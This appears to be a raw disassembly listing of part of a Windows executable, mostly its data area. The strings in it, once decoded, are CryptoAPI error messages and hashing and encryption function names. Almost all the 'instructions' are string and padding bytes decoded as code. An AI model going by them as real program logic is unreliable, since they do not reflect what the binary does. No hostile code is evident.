  405523:	add    BYTE PTR [eax+0x0],al
  405526:	add    BYTE PTR [eax],al
  405528:	inc    eax
  405529:	add    BYTE PTR [eax],al
  40552b:	add    BYTE PTR [eax+0x0],al
  40552e:	add    BYTE PTR [eax],al
  405530:	inc    eax
  405531:	add    BYTE PTR [eax],al
  405533:	add    BYTE PTR [eax+0x0],al
  405536:	add    BYTE PTR [eax],al
  405538:	inc    eax
  405539:	add    BYTE PTR [eax],al
  40553b:	add    BYTE PTR [eax+0x0],al
  40553e:	add    BYTE PTR [eax],al
  405540:	inc    eax
  405541:	add    BYTE PTR [eax],al
  405543:	add    BYTE PTR [eax+0x0],al
  405546:	add    BYTE PTR [eax],al
  405548:	inc    eax
  405549:	add    BYTE PTR [eax],al
  40554b:	add    BYTE PTR [eax+0x0],al
  40554e:	add    BYTE PTR [eax],al
  405550:	inc    eax
  405551:	add    BYTE PTR [eax],al
  405553:	add    BYTE PTR [eax+0x0],al
  405556:	add    BYTE PTR [eax],al
  405558:	inc    eax
  405559:	add    BYTE PTR [eax],al
  40555b:	add    BYTE PTR [eax+0x0],al
  40555e:	add    BYTE PTR [eax],al
  405560:	inc    eax
  405561:	add    BYTE PTR [eax],al
  405563:	add    BYTE PTR [eax+0x0],al
  405566:	add    BYTE PTR [eax],al
  405568:	inc    eax
  405569:	add    BYTE PTR [eax],al
  40556b:	add    BYTE PTR [eax+0x0],al
  40556e:	add    BYTE PTR [eax],al
  405570:	inc    eax
  405571:	add    BYTE PTR [eax],al
  405573:	add    BYTE PTR [eax+0x0],al
  405576:	add    BYTE PTR [eax],al
  405578:	inc    eax
  405579:	add    BYTE PTR [eax],al
  40557b:	add    BYTE PTR [eax+0x0],al
  40557e:	add    BYTE PTR [eax],al
  405580:	inc    eax
  405581:	add    BYTE PTR [eax],al
  405583:	add    BYTE PTR [eax+0x0],al
  405586:	add    BYTE PTR [eax],al
  405588:	inc    eax
  405589:	add    BYTE PTR [eax],al
  40558b:	add    BYTE PTR [eax+0x0],al
  40558e:	add    BYTE PTR [eax],al
  405590:	inc    eax
  405591:	add    BYTE PTR [eax],al
  405593:	add    BYTE PTR [eax+0x0],al
  405596:	add    BYTE PTR [eax],al
  405598:	inc    eax
  405599:	add    BYTE PTR [eax],al
  40559b:	add    BYTE PTR [eax+0x0],al
  40559e:	add    BYTE PTR [eax],al
  4055a0:	inc    eax
  4055a1:	add    BYTE PTR [eax],al
  4055a3:	add    BYTE PTR [eax+0x0],al
  4055a6:	add    BYTE PTR [eax],al
  4055a8:	inc    eax
  4055a9:	add    BYTE PTR [eax],al
  4055ab:	add    BYTE PTR [eax+0x0],al
  4055ae:	add    BYTE PTR [eax],al
  4055b0:	inc    eax
  4055b1:	add    BYTE PTR [eax],al
  4055b3:	add    BYTE PTR [eax+0x0],al
  4055b6:	add    BYTE PTR [eax],al
  4055b8:	inc    eax
  4055b9:	add    BYTE PTR [eax],al
  4055bb:	add    BYTE PTR [eax+0x0],al
  4055be:	add    BYTE PTR [eax],al
  4055c0:	inc    eax
  4055c1:	add    BYTE PTR [eax],al
  4055c3:	add    BYTE PTR [eax+0x0],al
  4055c6:	add    BYTE PTR [eax],al
  4055c8:	inc    eax
  4055c9:	add    BYTE PTR [eax],al
  4055cb:	add    BYTE PTR [eax+0x0],al
  4055ce:	add    BYTE PTR [eax],al
  4055d0:	inc    eax
  4055d1:	add    BYTE PTR [eax],al
  4055d3:	add    BYTE PTR [eax+0x0],al
  4055d6:	add    BYTE PTR [eax],al
  4055d8:	inc    eax
  4055d9:	add    BYTE PTR [eax],al
  4055db:	add    BYTE PTR [eax+0x0],al
  4055de:	add    BYTE PTR [eax],al
  4055e0:	inc    eax
  4055e1:	add    BYTE PTR [eax],al
  4055e3:	add    BYTE PTR [eax+0x0],al
  4055e6:	add    BYTE PTR [eax],al
  4055e8:	inc    eax
  4055e9:	add    BYTE PTR [eax],al
  4055eb:	add    BYTE PTR [eax+0x0],al
  4055ee:	add    BYTE PTR [eax],al
  4055f0:	inc    eax
  4055f1:	add    BYTE PTR [eax],al
  4055f3:	add    BYTE PTR [eax+0x0],al
  4055f6:	add    BYTE PTR [eax],al
  4055f8:	inc    eax
  4055f9:	add    BYTE PTR [eax],al
  4055fb:	add    BYTE PTR [eax+0x0],al
  4055fe:	add    BYTE PTR [eax],al
  405600:	inc    eax
  405601:	add    BYTE PTR [eax],al
  405603:	add    BYTE PTR [eax+0x0],al
  405606:	add    BYTE PTR [eax],al
  405608:	inc    eax
  405609:	add    BYTE PTR [eax],al
  40560b:	add    BYTE PTR [eax+0x0],al
  40560e:	add    BYTE PTR [eax],al
  405610:	inc    eax
  405611:	add    BYTE PTR [eax],al
  405613:	add    BYTE PTR [eax+0x0],al
  405616:	add    BYTE PTR [eax],al
  405618:	inc    eax
  405619:	add    BYTE PTR [eax],al
  40561b:	add    BYTE PTR [eax+0x0],al
  40561e:	add    BYTE PTR [eax],al
  405620:	inc    eax
  405621:	add    BYTE PTR [eax],al
  405623:	add    BYTE PTR [eax+0x0],al
  405626:	add    BYTE PTR [eax],al
  405628:	inc    eax
  405629:	add    BYTE PTR [eax],al
  40562b:	add    BYTE PTR [eax+0x0],al
  40562e:	add    BYTE PTR [eax],al
  405630:	inc    eax
  405631:	add    BYTE PTR [eax],al
  405633:	add    BYTE PTR [eax+0x0],al
  405636:	add    BYTE PTR [eax],al
  405638:	inc    eax
  405639:	add    BYTE PTR [eax],al
  40563b:	add    BYTE PTR [eax+0x0],al
  40563e:	add    BYTE PTR [eax],al
  405640:	inc    eax
  405641:	add    BYTE PTR [eax],al
  405643:	add    BYTE PTR [eax+0x0],al
  405646:	add    BYTE PTR [eax],al
  405648:	inc    eax
  405649:	add    BYTE PTR [eax],al
  40564b:	add    BYTE PTR [eax+0x0],al
  40564e:	add    BYTE PTR [eax],al
  405650:	inc    eax
  405651:	add    BYTE PTR [eax],al
  405653:	add    BYTE PTR [eax+0x0],al
  405656:	add    BYTE PTR [eax],al
  405658:	inc    eax
  405659:	add    BYTE PTR [eax],al
  40565b:	add    BYTE PTR [eax+0x0],al
  40565e:	add    BYTE PTR [eax],al
  405660:	inc    eax
  405661:	add    BYTE PTR [eax],al
  405663:	add    BYTE PTR [eax+0x0],al
  405666:	add    BYTE PTR [eax],al
  405668:	inc    eax
  405669:	add    BYTE PTR [eax],al
  40566b:	add    BYTE PTR [eax+0x0],al
  40566e:	add    BYTE PTR [eax],al
  405670:	inc    eax
  405671:	add    BYTE PTR [eax],al
  405673:	add    BYTE PTR [eax+0x0],al
  405676:	add    BYTE PTR [eax],al
  405678:	inc    eax
  405679:	add    BYTE PTR [eax],al
  40567b:	add    BYTE PTR [eax+0x0],al
  40567e:	add    BYTE PTR [eax],al
  405680:	inc    eax
  405681:	add    BYTE PTR [eax],al
  405683:	add    BYTE PTR [eax+0x0],al
  405686:	add    BYTE PTR [eax],al
  405688:	inc    eax
  405689:	add    BYTE PTR [eax],al
  40568b:	add    BYTE PTR [eax+0x0],al
  40568e:	add    BYTE PTR [eax],al
  405690:	inc    eax
  405691:	add    BYTE PTR [eax],al
  405693:	add    BYTE PTR [eax+0x0],al
  405696:	add    BYTE PTR [eax],al
  405698:	inc    eax
  405699:	add    BYTE PTR [eax],al
  40569b:	add    BYTE PTR [eax+0x0],al
  40569e:	add    BYTE PTR [eax],al
  4056a0:	inc    eax
  4056a1:	add    BYTE PTR [eax],al
  4056a3:	add    BYTE PTR [eax+0x0],al
  4056a6:	add    BYTE PTR [eax],al
  4056a8:	inc    eax
  4056a9:	add    BYTE PTR [eax],al
  4056ab:	add    BYTE PTR [eax+0x0],al
  4056ae:	add    BYTE PTR [eax],al
  4056b0:	inc    ebp
  4056b1:	jb     0x405725
  4056b3:	outs   dx,DWORD PTR ds:[esi]
  4056b4:	jb     0x4056d6
  4056b6:	xor    BYTE PTR [eax+0x25],bh
  4056b9:	js     0x4056db
  4056bb:	fs jne 0x405730
  4056be:	imul   ebp,DWORD PTR [esi+0x67],0x79724320
  4056c5:	jo     0x40573b
  4056c7:	inc    ebx
  4056c8:	jb     0x40572f
  4056ca:	popa   
  4056cb:	je     0x405732
  4056cd:	dec    eax
  4056ce:	popa   
  4056cf:	jae    0x405739
  4056d1:	add    BYTE PTR [eax],al
  4056d3:	add    BYTE PTR [ebp+0x72],al
  4056d6:	jb     0x405747
  4056d8:	jb     0x4056fa
  4056da:	xor    BYTE PTR [eax+0x25],bh
  4056dd:	js     0x4056ff
  4056df:	fs jne 0x405754
  4056e2:	imul   ebp,DWORD PTR [esi+0x67],0x79724320
  4056e9:	jo     0x40575f
  4056eb:	dec    eax
  4056ec:	popa   
  4056ed:	jae    0x405757
  4056ef:	inc    esp
  4056f0:	popa   
  4056f1:	je     0x405754
  4056f3:	add    BYTE PTR [ebp+0x72],al
  4056f6:	jb     0x405767
  4056f8:	jb     0x40571a
  4056fa:	xor    BYTE PTR [eax+0x25],bh
  4056fd:	js     0x40571f
  4056ff:	fs jne 0x405774
  405702:	imul   ebp,DWORD PTR [esi+0x67],0x79724320
  405709:	jo     0x40577f
  40570b:	inc    esp
  40570c:	gs jb  0x405778
  40570f:	jbe    0x405776
  405711:	dec    ebx
  405712:	gs jns 0x405715
  405715:	add    BYTE PTR [eax],al
  405717:	add    BYTE PTR [ebx+0x72],al
  40571a:	jns    0x40578c
  40571c:	je     0x40575f
  40571e:	arpl   WORD PTR [ecx+0x75],si
  405721:	imul   esi,DWORD PTR [edx+0x65],0x746e6f43
  405728:	gs js  0x40579f
  40572b:	inc    ecx
  40572c:	add    BYTE PTR [eax],al
  40572e:	add    BYTE PTR [eax],al
  405730:	inc    ebx
  405731:	jb     0x4057ac
  405733:	jo     0x4057a9
  405735:	inc    ebx
  405736:	jb     0x40579d
  405738:	popa   
  405739:	je     0x4057a0
  40573b:	dec    eax
  40573c:	popa   
  40573d:	jae    0x4057a7
  40573f:	add    BYTE PTR [ebx+0x72],al
  405742:	jns    0x4057b4
  405744:	je     0x40578a
  405746:	arpl   WORD PTR gs:[edx+0x79],si
  40574a:	jo     0x4057c0
  40574c:	add    BYTE PTR [eax],al
  40574e:	add    BYTE PTR [eax],al
  405750:	inc    ebx
  405751:	jb     0x4057cc
  405753:	jo     0x4057c9
  405755:	inc    esp
  405756:	gs jb  0x4057c2
  405759:	jbe    0x4057c0
  40575b:	dec    ebx
  40575c:	gs jns 0x40575f
  40575f:	add    BYTE PTR [ebx+0x72],al
  405762:	jns    0x4057d4
  405764:	je     0x4057aa
  405766:	gs jae 0x4057dd
  405769:	jb     0x4057da
  40576b:	jns    0x4057b5
  40576d:	popa   
  40576e:	jae    0x4057d8
  405770:	add    BYTE PTR [eax],al
  405772:	add    BYTE PTR [eax],al
  405774:	inc    ebx
  405775:	jb     0x4057f0
  405777:	jo     0x4057ed
  405779:	inc    esp
  40577a:	gs jae 0x4057f1
  40577d:	jb     0x4057ee
  40577f:	jns    0x4057cc
  405781:	gs jns 0x405784
  405784:	inc    ebx
  405785:	jb     0x405800
  405787:	jo     0x4057fd
  405789:	inc    ebp
  40578a:	outs   dx,BYTE PTR ds:[esi]
  40578b:	arpl   WORD PTR [edx+0x79],si
  40578e:	jo     0x405804
  405790:	add    BYTE PTR [eax],al
  405792:	add    BYTE PTR [eax],al
  405794:	inc    ebx
  405795:	jb     0x405810
  405797:	jo     0x40580d
  405799:	dec    eax
  40579a:	popa   
  40579b:	jae    0x405805
  40579d:	inc    esp
  40579e:	popa   
  40579f:	je     0x405802
  4057a1:	add    BYTE PTR [eax],al
  4057a3:	add    BYTE PTR [ebx+0x72],al
  4057a6:	jns    0x405818
  4057a8:	je     0x4057fc
  4057aa:	gs ins BYTE PTR es:[edi],dx
  4057ac:	gs popa 
  4057ae:	jae    0x405815
  4057b0:	inc    ebx
  4057b1:	outs   dx,DWORD PTR ds:[esi]
  4057b2:	outs   dx,BYTE PTR ds:[esi]
  4057b3:	je     0x40581a
  4057b5:	js     0x40582b
  4057b7:	add    BYTE PTR [ebx+0x72],al
  4057ba:	jns    0x40582c
  4057bc:	je     0x405805
  4057be:	outs   dx,BYTE PTR gs:[esi]
  4057c0:	push   edx
  4057c1:	popa   
  4057c2:	outs   dx,BYTE PTR ds:[esi]
  4057c3:	outs   dx,DWORD PTR fs:[esi]
  4057c5:	ins    DWORD PTR es:[edi],dx
  4057c6:	add    BYTE PTR [eax],al
  4057c8:	inc    ecx
  4057c9:	fs jbe 0x40582d
  4057cc:	jo     0x405837
  4057ce:	xor    esi,DWORD PTR [edx]
  4057d0:	cs fs ins BYTE PTR es:[edi],dx
  4057d3:	ins    BYTE PTR es:[edi],dx
  4057d4:	add    BYTE PTR [eax],al
  4057d6:	add    BYTE PTR [eax],al
  4057d8:	dec    ebp
  4057d9:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4057e0:	je     0x405802
  4057e2:	inc    ebp
  4057e3:	outs   dx,BYTE PTR ds:[esi]
  4057e4:	push   0x65636e61
  4057e9:	and    BYTE PTR fs:[ebx+0x72],al
  4057ed:	jns    0x40585f
  4057ef:	je     0x405860
  4057f1:	addr16 jb 0x405855
  4057f4:	jo     0x40585e
  4057f6:	imul   esp,DWORD PTR [ebx+0x20],0x766f7250
  4057fd:	imul   esp,DWORD PTR [ebp+eiz*2+0x72],0x2e317620
  405805:	xor    BYTE PTR [eax],al
  405807:	add    BYTE PTR [ebx+0x4d],al
  40580a:	and    BYTE PTR [ebx+0x72],al
  40580d:	jns    0x40587f
  40580f:	je     0x405880
  405811:	and    BYTE PTR [ebx+0x6f],al
  405814:	outs   dx,BYTE PTR ds:[esi]
  405815:	je     0x405878
  405817:	imul   ebp,DWORD PTR [esi+0x65],0x72
  40581e:	add    BYTE PTR [eax],al
  405820:	inc    ebx
  405821:	jb     0x40589c
  405823:	jo     0x405899
  405825:	inc    ecx
  405826:	arpl   WORD PTR [ecx+0x75],si
  405829:	imul   esi,DWORD PTR [edx+0x65],0x746e6f43
  405830:	gs js  0x4058a7
  405833:	and    BYTE PTR [esi+0x61],ah
  405836:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x74697720
  40583e:	push   0x72726520
  405843:	outs   dx,DWORD PTR ds:[esi]
  405844:	jb     0x405866
  405846:	xor    BYTE PTR [eax+0x25],bh
  405849:	js     0x405879
  40584b:	and    BYTE PTR [edi+0x69],dl
  40584e:	ins    BYTE PTR es:[edi],dx
  40584f:	ins    BYTE PTR es:[edi],dx
  405850:	and    BYTE PTR [edx+esi*2+0x79],dh
  405854:	and    BYTE PTR [ecx+0x20],ah
  405857:	jae    0x4058be
  405859:	arpl   WORD PTR [edi+0x6e],bp
  40585c:	and    BYTE PTR fs:[ebx+0x61],ah
  405860:	ins    BYTE PTR es:[edi],dx
  405861:	ins    BYTE PTR es:[edi],dx
  405862:	add    BYTE PTR [eax],al
  405864:	inc    ebx
  405865:	popa   
  405866:	ins    BYTE PTR es:[edi],dx
  405867:	ins    BYTE PTR es:[edi],dx
  405868:	imul   ebp,DWORD PTR [esi+0x67],0x79724320
  40586f:	jo     0x4058e5
  405871:	inc    ecx
  405872:	arpl   WORD PTR [ecx+0x75],si
  405875:	imul   esi,DWORD PTR [edx+0x65],0x746e6f43
  40587c:	gs js  0x4058f3
  40587f:	and    BYTE PTR [ecx+0x67],ah
  405882:	popa   
  405883:	imul   ebp,DWORD PTR [esi+0x20],0x63206f74
  40588a:	jb     0x4058f1
  40588c:	popa   
  40588d:	je     0x4058f4
  40588f:	and    BYTE PTR [ebx+0x65],ch
  405892:	jns    0x405907
  405894:	gs je  0x405897
  405897:	add    BYTE PTR [esi+0x61],al
  40589a:	je     0x4058fd
  40589c:	ins    BYTE PTR es:[edi],dx
  40589d:	and    BYTE PTR [ebp+0x72],al
  4058a0:	jb     0x405911
  4058a2:	jb     0x4058c4
  4058a4:	xor    BYTE PTR [eax+0x25],bh
  4058a7:	js     0x4058c9
  4058a9:	fs jne 0x40591e
  4058ac:	imul   ebp,DWORD PTR [esi+0x67],0x63657320
  4058b3:	outs   dx,DWORD PTR ds:[esi]
  4058b4:	outs   dx,BYTE PTR ds:[esi]
  4058b5:	and    BYTE PTR fs:[ebx+0x61],ah
  4058b9:	ins    BYTE PTR es:[edi],dx
  4058ba:	ins    BYTE PTR es:[edi],dx
  4058bb:	and    BYTE PTR [edi+ebp*2+0x20],dh
  4058bf:	inc    ebx
  4058c0:	jb     0x40593b
  4058c2:	jo     0x405938
  4058c4:	inc    ecx
  4058c5:	arpl   WORD PTR [ecx+0x75],si
  4058c8:	imul   esi,DWORD PTR [edx+0x65],0x746e6f43
  4058cf:	gs js  0x405946
  4058d2:	add    BYTE PTR [eax],al
  4058d4:	add    BYTE PTR [eax],al
  4058d6:	add    BYTE PTR [eax],al
  4058d8:	inc    ebx
  4058d9:	inc    ebx
  4058da:	jb     0x405955
  4058dc:	jo     0x405952
  4058de:	inc    esi
  4058df:	jne    0x40594f
  4058e1:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  4058e5:	outs   dx,BYTE PTR ds:[esi]
  4058e6:	jae    0x405922
  4058e8:	cmp    al,BYTE PTR [ebp+eiz*2+0x63]
  4058ec:	jb     0x405967
  4058ee:	jo     0x405964
  4058f0:	inc    esp
  4058f1:	popa   
  4058f2:	je     0x405955
  4058f4:	push   edi
  4058f5:	imul   esi,DWORD PTR [eax+ebp*2+0x4b],0x2d207965
  4058fd:	and    BYTE PTR [ebp+0x61],cl
  405900:	je     0x40596a
  405902:	and    BYTE PTR [edi+0x76],ch
  405905:	gs jb  0x40596e
  405908:	ins    BYTE PTR es:[edi],dx
  405909:	outs   dx,DWORD PTR ds:[esi]
  40590a:	ja     0x40592c
  40590c:	fs gs je 0x405975
  405910:	arpl   WORD PTR [ebp+eiz*2+0x64],si
  405914:	and    BYTE PTR cs:[edx+0x61],al
  405918:	imul   ebp,DWORD PTR [ecx+ebp*2+0x6e],0x756f2067
  405920:	je     0x405950
  405922:	cs add BYTE PTR cs:[eax],al
  405926:	add    BYTE PTR [eax],al
  405928:	inc    esp
  405929:	arpl   WORD PTR gs:[edx+0x79],si
  40592d:	jo     0x4059a3
  40592f:	inc    esp
  405930:	popa   
  405931:	je     0x405994
  405933:	push   edi
  405934:	imul   esi,DWORD PTR [eax+ebp*2+0x4b],0x203a7965
  40593c:	outs   dx,BYTE PTR ds:[esi]
  40593d:	outs   dx,DWORD PTR ds:[esi]
  40593e:	je     0x405960
  405940:	outs   dx,BYTE PTR gs:[esi]
  405942:	outs   dx,DWORD PTR ds:[esi]
  405943:	jne    0x4059ac
  405945:	push   0x66756220
  40594a:	data16 gs jb 0x40596e
  40594e:	cmp    eax,0x20642520
  405953:	bound  edi,QWORD PTR [ecx+0x74]
  405956:	gs jae 0x405959
  405959:	add    BYTE PTR [eax],al
  40595b:	add    dh,ah
  40595d:	adc    al,0x2
  40595f:	add    BYTE PTR [eax],al
  405961:	add    BYTE PTR [eax],al
  405963:	add    al,al
  405965:	add    BYTE PTR [eax],al
  405967:	add    BYTE PTR [eax],al
  405969:	add    BYTE PTR [eax],al
  40596b:	inc    esi
	...
  405974:	and    edi,DWORD PTR ds:0x559f
  40597a:	add    BYTE PTR [eax],al
  40597c:	add    al,BYTE PTR [eax]
  40597e:	add    BYTE PTR [eax],al
  405980:	and    al,BYTE PTR [eax]
  405982:	add    BYTE PTR [eax],al
  405984:	xor    al,0x5a
  405986:	add    BYTE PTR [eax],al
  405988:	xor    al,0x4e
  40598a:	add    BYTE PTR [eax],al
  40598c:	add    BYTE PTR [eax],al
  40598e:	add    BYTE PTR [eax],al
  405990:	and    edi,DWORD PTR ds:0x559f
  405996:	add    BYTE PTR [eax],al
  405998:	or     eax,0xc8000000
  40599d:	add    DWORD PTR [eax],eax
  40599f:	add    BYTE PTR [edx+ebx*2+0x0],ch
  4059a3:	add    BYTE PTR [esi+ecx*2+0x0],ch
	...
  4059c7:	add    BYTE PTR [eax+0x0],ch
	...
  405a02:	add    BYTE PTR [eax],al
  405a04:	add    al,0x30
  405a06:	inc    ecx
  405a07:	add    BYTE PTR [eax],dh
  405a09:	pop    edx
  405a0a:	inc    eax
  405a0b:	add    BYTE PTR [ecx],al
  405a0d:	add    BYTE PTR [eax],al
  405a0f:	add    BYTE PTR [eax],ah
  405a11:	inc    edx
  405a12:	inc    ecx
  405a13:	add    BYTE PTR [eax],al
  405a15:	add    BYTE PTR [eax],al
  405a17:	add    BYTE PTR [eax+edx*1],bl
  405a1a:	inc    eax
  405a1b:	add    BYTE PTR [esi],cl
  405a1d:	add    BYTE PTR [eax],al
  405a1f:	add    BYTE PTR [eax],al
  405a21:	xor    eax,0x0
	...
  405a2e:	add    BYTE PTR [eax],al
  405a30:	pusha  
  405a31:	pop    ds
  405a32:	add    DWORD PTR [eax],eax
  405a34:	push   edx
  405a35:	push   ebx
  405a36:	inc    esp
  405a37:	push   ebx
  405a38:	icebp  
  405a39:	lea    esp,[ebx+0x5fabcac0]
  405a3f:	dec    eax
  405a40:	test   eax,0xfd0cf9b2
  405a45:	sti    
  405a46:	out    0x5e,al
  405a48:	add    DWORD PTR [eax],eax
  405a4a:	add    BYTE PTR [eax],al
  405a4c:	arpl   WORD PTR [ebp+0x73],bp
  405a4f:	je     0x405ac1
  405a51:	cs jo  0x405ab8
  405a54:	bound  eax,QWORD PTR [eax]
	...
  405a6a:	add    BYTE PTR [eax],al
  405a6c:	inc    edi
  405a6d:	inc    ebx
  405a6e:	push   esp
  405a6f:	dec    esp
  405a70:	add    BYTE PTR [eax],dl
  405a72:	add    BYTE PTR [eax],al
  405a74:	add    al,0x0
  405a76:	add    BYTE PTR [eax],al
  405a78:	cs inc ebx
  405a7a:	push   edx
  405a7b:	push   esp
  405a7c:	and    al,0x58
  405a7e:	inc    ebx
  405a7f:	inc    ecx
  405a80:	add    BYTE PTR [eax],al
  405a82:	add    BYTE PTR [eax],al
  405a84:	add    al,0x10
  405a86:	add    BYTE PTR [eax],al
  405a88:	add    al,0x0
  405a8a:	add    BYTE PTR [eax],al
  405a8c:	cs inc ebx
  405a8e:	push   edx
  405a8f:	push   esp
  405a90:	and    al,0x58
  405a92:	inc    ebx
  405a93:	inc    ecx
  405a94:	inc    ecx
  405a95:	add    BYTE PTR [eax],al
  405a97:	add    BYTE PTR [eax],cl
  405a99:	adc    BYTE PTR [eax],al
  405a9b:	add    BYTE PTR [eax+eax*1],al
  405a9e:	add    BYTE PTR [eax],al
  405aa0:	cs inc ebx
  405aa2:	push   edx
  405aa3:	push   esp
  405aa4:	and    al,0x58
  405aa6:	inc    ebx
  405aa7:	pop    edx
  405aa8:	add    BYTE PTR [eax],al
  405aaa:	add    BYTE PTR [eax],al
  405aac:	or     al,0x10
  405aae:	add    BYTE PTR [eax],al
  405ab0:	add    al,0x0
  405ab2:	add    BYTE PTR [eax],al
  405ab4:	cs inc ebx
  405ab6:	push   edx
  405ab7:	push   esp
  405ab8:	and    al,0x58
  405aba:	dec    ecx
  405abb:	inc    ecx
  405abc:	add    BYTE PTR [eax],al
  405abe:	add    BYTE PTR [eax],al
  405ac0:	adc    BYTE PTR [eax],dl
  405ac2:	add    BYTE PTR [eax],al
  405ac4:	add    al,0x0
  405ac6:	add    BYTE PTR [eax],al
  405ac8:	cs inc ebx
  405aca:	push   edx
  405acb:	push   esp
  405acc:	and    al,0x58
  405ace:	dec    ecx
  405acf:	inc    ecx
  405ad0:	inc    ecx
  405ad1:	add    BYTE PTR [eax],al
  405ad3:	add    BYTE PTR [eax+edx*1],dl
  405ad6:	add    BYTE PTR [eax],al
  405ad8:	add    al,0x0
  405ada:	add    BYTE PTR [eax],al
  405adc:	cs inc ebx
  405ade:	push   edx
  405adf:	push   esp
  405ae0:	and    al,0x58
  405ae2:	dec    ecx
  405ae3:	pop    ecx
  405ae4:	add    BYTE PTR [eax],al
  405ae6:	add    BYTE PTR [eax],al
  405ae8:	sbb    BYTE PTR [eax],dl
  405aea:	add    BYTE PTR [eax],al
  405aec:	add    al,0x0
  405aee:	add    BYTE PTR [eax],al
  405af0:	cs inc ebx
  405af2:	push   edx
  405af3:	push   esp
  405af4:	and    al,0x58
  405af6:	dec    ecx
  405af7:	pop    edx
  405af8:	add    BYTE PTR [eax],al
  405afa:	add    BYTE PTR [eax],al
  405afc:	sbb    al,0x10
  405afe:	add    BYTE PTR [eax],al
  405b00:	cmp    BYTE PTR [eax],al
  405b02:	add    BYTE PTR [eax],al
  405b04:	imul   sp,WORD PTR cs:[si+0x73],0x7824
  405b0c:	add    BYTE PTR [eax],al
  405b0e:	add    BYTE PTR [eax],al
  405b10:	pusha  
  405b11:	adc    BYTE PTR [eax],al
  405b13:	add    al,dl
  405b15:	dec    ecx
  405b16:	add    BYTE PTR [eax],al
  405b18:	cs jb  0x405b7f
  405b1b:	popa   
  405b1c:	je     0x405b7f
  405b1e:	add    BYTE PTR [eax],al
  405b20:	xor    BYTE PTR [edx+0x0],bl
  405b23:	add    BYTE PTR [eax+eax*1],al
  405b26:	add    BYTE PTR [eax],al
  405b28:	cs jb  0x405b8f
  405b2b:	popa   
  405b2c:	je     0x405b8f
  405b2e:	and    al,0x73
  405b30:	js     0x405b96
  405b32:	popa   
  405b33:	je     0x405b96
  405b35:	add    BYTE PTR [eax],al
  405b37:	add    BYTE PTR [edx+ebx*2],dh
  405b3a:	add    BYTE PTR [eax],al
  405b3c:	add    BYTE PTR [edx],al
  405b3e:	add    BYTE PTR [eax],al
  405b40:	cs jb  0x405ba7
  405b43:	popa   
  405b44:	je     0x405ba7
  405b46:	and    al,0x7a
  405b48:	jp     0x405bc4
  405b4a:	bound  esp,QWORD PTR fs:[edi+0x0]
  405b4e:	add    BYTE PTR [eax],al
  405b50:	inc    eax
  405b51:	pop    esp
  405b52:	add    BYTE PTR [eax],al
  405b54:	les    eax,FWORD PTR es:[eax]
  405b57:	add    BYTE PTR [esi],ch
  405b59:	je     0x405bc0
  405b5b:	js     0x405bd1
  405b5d:	and    al,0x6d
  405b5f:	outs   dx,BYTE PTR ds:[esi]
  405b60:	add    BYTE PTR [eax],al
  405b62:	add    BYTE PTR [eax],al
  405b64:	push   0x64000120
  405b69:	add    BYTE PTR [eax],al
  405b6b:	add    BYTE PTR [esi],ch
  405b6d:	js     0x405bd3
  405b6f:	popa   
  405b70:	je     0x405bd3
  405b72:	and    al,0x78
  405b74:	add    BYTE PTR [eax],al
  405b76:	add    BYTE PTR [eax],al
  405b78:	add    BYTE PTR [eax],dh
  405b7a:	add    DWORD PTR [eax],eax
  405b7c:	and    BYTE PTR [ecx],al
  405b7e:	add    BYTE PTR [eax],al
  405b80:	cs fs popa 
  405b83:	je     0x405be6
  405b85:	add    BYTE PTR [eax],al
  405b87:	add    BYTE PTR [eax],ah
  405b89:	xor    DWORD PTR [ecx],eax
  405b8b:	add    al,bh
  405b8d:	pop    es
  405b8e:	add    BYTE PTR [eax],al
  405b90:	bound  esi,QWORD PTR cs:[ebx+0x73]
  405b94:	add    BYTE PTR [eax],al
  405b96:	add    BYTE PTR [eax],al
  405b98:	add    BYTE PTR [eax+0x1],al
  405b9b:	add    BYTE PTR [eax],ah
  405b9d:	add    al,BYTE PTR [eax]
  405b9f:	add    BYTE PTR [esi],ch
  405ba1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x352461
  405ba9:	add    BYTE PTR [eax],al
  405bab:	add    BYTE PTR [eax],ah
  405bad:	inc    edx
  405bae:	add    DWORD PTR [eax],eax
  405bb0:	add    al,0x0
  405bb2:	add    BYTE PTR [eax],al
  405bb4:	xor    BYTE PTR cs:[eax],dh
  405bb7:	arpl   WORD PTR [esi+0x67],sp
  405bba:	add    BYTE PTR [eax],al
  405bbc:	and    al,0x42
  405bbe:	add    DWORD PTR [eax],eax
  405bc0:	mov    al,ds:0x2e000000
  405bc5:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x322461
  405bcd:	add    BYTE PTR [eax],al
  405bcf:	add    ah,al
  405bd1:	inc    edx
  405bd2:	add    DWORD PTR [eax],eax
  405bd4:	adc    al,0x0
  405bd6:	add    BYTE PTR [eax],al
  405bd8:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  405be1:	add    BYTE PTR [eax],al
  405be3:	add    al,bl
  405be5:	inc    edx
  405be6:	add    DWORD PTR [eax],eax
  405be8:	and    BYTE PTR [edx],al
  405bea:	add    BYTE PTR [eax],al
  405bec:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x342461
  405bf5:	add    BYTE PTR [eax],al
  405bf7:	add    al,bh
  405bf9:	inc    esp
  405bfa:	add    DWORD PTR [eax],eax
  405bfc:	inc    esi
  405bfd:	or     DWORD PTR [eax],eax
  405bff:	add    BYTE PTR [esi],ch
  405c01:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x362461
  405c09:	add    BYTE PTR [eax],al
  405c0b:	add    BYTE PTR [eax],al
  405c0d:	push   eax
  405c0e:	add    DWORD PTR [eax],eax
  405c10:	fadd   DWORD PTR [ecx]
  405c12:	add    BYTE PTR [eax],al
  405c14:	cs jb  0x405c8a
  405c17:	jb     0x405c7c
  405c19:	and    al,0x30
  405c1b:	xor    DWORD PTR [eax],eax
  405c1d:	add    BYTE PTR [eax],al
  405c1f:	add    al,ah
  405c21:	push   ecx
  405c22:	add    DWORD PTR [eax],eax
  405c24:	ror    BYTE PTR [ebx],0x0
  405c27:	add    BYTE PTR [esi],ch
  405c29:	jb     0x405c9e
  405c2b:	jb     0x405c90
  405c2d:	and    al,0x30
  405c2f:	xor    al,BYTE PTR [eax]
	...
  405c45:	mov    edi,edi
  405c47:	push   esi
  405c48:	mov    esi,ecx
  405c4a:	mov    eax,DWORD PTR [esi+0xc]
  405c4d:	mov    DWORD PTR [esi],0x40143c
